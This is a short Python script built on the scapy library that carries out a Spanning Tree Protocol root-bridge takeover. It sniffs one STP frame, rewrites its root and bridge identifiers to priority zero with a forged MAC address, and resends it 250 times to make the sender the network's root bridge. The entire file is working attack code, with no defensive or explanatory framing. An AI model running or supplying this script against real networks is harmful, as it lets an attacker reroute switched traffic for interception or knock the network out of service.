#!/usr/bin/env python3.11
""" Best Way To Predict Future, Is To Create It
	Abraham Lincoln

	This Module Will Fake The Network That, I Am
	The Root-Bridge Of The Network
	"""

from scapy.all import sniff as sn
from scapy.all import sendp
from time import sleep


def sniffing_function ():
	"""Sniffing STP Packet Function
	:return: Sniffed STP Packet .
	"""
	return sn(filter="ether dst 01:80:c2:00:00:00", count=1)


def packet_modification_function (sniffed_pkt):
	"""Modify STP Sniffed Packet Information
	:return Modified Sniffed-STP Packet
	"""
	sniffed_pkt [0].src = "00:00:00:00:00:01"
	sniffed_pkt [0].rootid = 0
	sniffed_pkt [0].rootmac = "00:00:00:00:00:01"
	sniffed_pkt [0].bridgeid = 0
	sniffed_pkt [0].bridgemac = "00:00:00:00:00:01"
	print(sniffed_pkt [0].show())
	return sniffed_pkt


def attack_function (sniffed_pkt):
	"""Send And Attack Function
	:return: Nothing
	"""
	for _ in range(250):
		sendp(sniffed_pkt [0], loop=0, verbose=True)
		sleep(1)


sniffed_STP_packet = sniffing_function()
modified_sniffed_STP_packet = packet_modification_function(sniffed_pkt=sniffed_STP_packet)
attack_function(sniffed_pkt=modified_sniffed_STP_packet)
